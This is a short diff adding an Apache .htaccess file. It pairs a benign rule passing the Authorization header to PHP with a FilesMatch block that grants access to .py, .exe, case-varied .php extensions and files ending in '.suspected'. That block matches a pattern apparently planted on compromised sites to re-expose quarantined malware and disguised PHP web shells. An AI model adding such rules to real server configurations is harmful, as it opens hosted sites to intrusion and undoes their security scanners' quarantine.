@@ -1,0 +1,9 @@
+<FilesMatch '.(py|exe|php|PHP|Php|PHp|pHp|pHP|pHP7|PHP7|phP|PhP|php5|suspected)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
+
+# Pass Authorization header to PHP (required for Bluehost/Apache)
+RewriteEngine On
+RewriteCond %{HTTP:Authorization} ^(.*)
+RewriteRule .* - [e=HTTP_AUTHORIZATION:%1]
